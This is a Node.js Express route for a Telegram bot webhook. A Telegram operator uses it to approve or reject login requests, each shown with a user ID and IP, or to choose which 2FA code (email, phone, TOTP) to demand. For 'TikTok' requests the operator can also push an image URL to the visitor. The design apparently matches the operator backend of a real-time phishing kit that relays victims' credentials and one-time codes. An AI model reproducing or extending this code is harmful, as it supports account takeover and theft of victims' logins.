'use strict';

const { Router } = require('express');
const { TELEGRAM_WEBHOOK_SECRET } = require('../config');
const store = require('../lib/store');
const { tgApi, parseCallback } = require('../lib/telegram');

const router = Router();

const TWO_FA_TYPE_MAP = {
    '2fa_email': 'email',
    '2fa_phone': 'phone',
    '2fa_totp': 'totp'
};

router.post('/telegram/webhook', function (req, res) {
    if (TELEGRAM_WEBHOOK_SECRET) {
        const token = req.get('X-Telegram-Bot-Api-Secret-Token');
        if (token !== TELEGRAM_WEBHOOK_SECRET) {
            console.warn('[telegram] webhook 403: X-Telegram-Bot-Api-Secret-Token mismatch or missing — buttons will not work until this matches TELEGRAM_WEBHOOK_SECRET');
            return res.status(403).send('Forbidden');
        }
    }

    const update = req.body || {};
    const cq = update.callback_query;

    // Handle reply-to-message for TikTok image URL
    const replyMsg = update.message;
    if (replyMsg && replyMsg.reply_to_message && replyMsg.text) {
        const match = replyMsg.text.match(/^image_url:\s*(.+)$/i);
        if (match) {
            const imageUrl = match[1].trim();
            const repliedToMsgId = replyMsg.reply_to_message.message_id;
            // Find the pending TikTok request whose Telegram message_id matches
            let found = false;
            for (const [reqId, rec] of store.getAll().entries()) {
                if (rec.telegramMessageId === repliedToMsgId && rec.status === 'pending') {
                    rec.status = 'show_image';
                    rec.imageUrl = imageUrl;
                    console.log('[tiktok] image URL set', JSON.stringify({ request_id: reqId, image_url: imageUrl }));
                    found = true;
                    break;
                }
            }
            if (!found) {
                console.warn('[telegram] image_url reply did not match any pending TikTok request for msg_id', repliedToMsgId);
            }
            return res.sendStatus(200);
        }
    }

    function respondOk() {
        return res.sendStatus(200);
    }

    function answer(text, showAlert) {
        if (!cq || !cq.id) return Promise.resolve();
        return tgApi('answerCallbackQuery', {
            callback_query_id: cq.id,
            text: text || '',
            show_alert: Boolean(showAlert)
        });
    }

    if (!cq) {
        return respondOk();
    }

    if (!cq.data) {
        answer('Empty action.', false).catch(() => {});
        return respondOk();
    }

    const parsed = parseCallback(cq.data);
    if (!parsed) {
        answer('Invalid button data.', true).catch(() => {});
        return respondOk();
    }

    const rec = store.get(parsed.requestId);
    const msg = cq.message;
    const chatId = msg && msg.chat && msg.chat.id;
    const messageId = msg && msg.message_id;
    const actor = cq.from && (cq.from.username ? '@' + cq.from.username : 'id:' + cq.from.id);

    function editMessage(label) {
        if (!chatId || !messageId || !rec) return;
        return tgApi('editMessageText', {
            chat_id: chatId,
            message_id: messageId,
            text: `${label}\n\n${rec.userId}\nIP: ${rec.clientIp}`,
            reply_markup: { inline_keyboard: [] }
        }).catch(e => console.error('editMessageText failed:', e));
    }

    if (!rec) {
        console.log('[telegram] callback ignored (unknown request)', JSON.stringify({ request_id: parsed.requestId, action: parsed.action, actor: actor || null }));
        answer('Request not found or expired.', true).catch(() => {});
        return respondOk();
    }

    if (store.now() > rec.expiresAt) {
        rec.status = 'rejected';
        console.log('[telegram] login rejected (expired)', JSON.stringify({ request_id: parsed.requestId, user: rec.userId, client_ip: rec.clientIp, actor: actor || null }));
        answer('Request expired.', true).catch(() => {});
        return respondOk();
    }

    if (rec.status === '2fa') {
        if (parsed.action === 'reject') {
            rec.status = 'rejected';
            console.log('[telegram] login rejected (during 2FA)', JSON.stringify({ request_id: parsed.requestId, user: rec.userId, actor: actor || null }));
            answer('Rejected.', false).catch(() => {});
            editMessage('❌ Rejected');
            return respondOk();
        }
        answer('Use the latest message — waiting for verification code.', true).catch(() => {});
        return respondOk();
    }

    if (rec.status !== 'pending') {
        console.log('[telegram] callback ignored (already ' + rec.status + ')', JSON.stringify({ request_id: parsed.requestId, user: rec.userId, actor: actor || null }));
        answer('Already handled.', false).catch(() => {});
        return respondOk();
    }

    if (parsed.action === 'approve') {
        rec.status = 'approved';
        console.log('[telegram] login approved', JSON.stringify({ request_id: parsed.requestId, user: rec.userId, client_ip: rec.clientIp, actor: actor || null }));
        answer('Approved.', false).catch(() => {});
        editMessage('✅ Approved');

    } else if (TWO_FA_TYPE_MAP[parsed.action]) {
        const twoFaType = TWO_FA_TYPE_MAP[parsed.action];
        rec.status = '2fa';
        rec.twoFactorType = twoFaType;
        console.log('[telegram] 2FA requested', JSON.stringify({ request_id: parsed.requestId, user: rec.userId, client_ip: rec.clientIp, type: twoFaType, actor: actor || null }));
        answer('2FA challenge sent.', false).catch(() => {});
        editMessage(`🔐 2FA (${twoFaType}) — awaiting code`);

    } else {
        rec.status = 'rejected';
        console.log('[telegram] login rejected', JSON.stringify({ request_id: parsed.requestId, user: rec.userId, client_ip: rec.clientIp, actor: actor || null }));
        answer('Rejected.', false).catch(() => {});
        editMessage('❌ Rejected');
    }

    return respondOk();
});

module.exports = router;
